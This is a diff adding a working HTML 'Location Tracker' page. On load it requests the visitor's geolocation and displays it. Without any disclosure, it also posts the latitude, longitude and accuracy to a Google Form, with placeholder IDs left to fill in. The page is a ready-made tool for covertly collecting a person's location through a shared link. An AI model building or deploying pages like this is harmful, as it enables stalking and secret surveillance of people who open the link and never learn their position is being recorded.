@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Location Tracker</title>
+    <script>
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(showPosition, showError);
+            } else {
+                alert("Geolocation is not supported by this browser.");
+            }
+        }
+
+        function showPosition(position) {
+            let latitude = position.coords.latitude;
+            let longitude = position.coords.longitude;
+            let accuracy = position.coords.accuracy;
+
+            // Show the location on screen
+            document.getElementById("location").innerHTML = 
+                "Latitude: " + latitude + "<br>Longitude: " + longitude + 
+                "<br>Accuracy: " + accuracy + " meters";
+
+            // Send location data to a Google Form (Alternative to a server)
+            let googleFormURL = "https://docs.google.com/forms/d/e/YOUR_FORM_ID/formResponse";
+            fetch(googleFormURL, {
+                method: "POST",
+                mode: "no-cors",
+                body: new URLSearchParams({
+                    "entry.YOUR_LAT_FIELD_ID": latitude,
+                    "entry.YOUR_LON_FIELD_ID": longitude,
+                    "entry.YOUR_ACC_FIELD_ID": accuracy
+                })
+            });
+        }
+
+        function showError(error) {
+            switch (error.code) {
+                case error.PERMISSION_DENIED:
+                    alert("User denied the request for Geolocation.");
+                    break;
+                case error.POSITION_UNAVAILABLE:
+                    alert("Location information is unavailable.");
+                    break;
+                case error.TIMEOUT:
+                    alert("The request to get user location timed out.");
+                    break;
+                case error.UNKNOWN_ERROR:
+                    alert("An unknown error occurred.");
+                    break;
+            }
+        }
+    </script>
+</head>
+<body onload="getLocation()">
+    <h1>Getting Location...</h1>
+    <p id="location"></p>
+</body>
+</html>
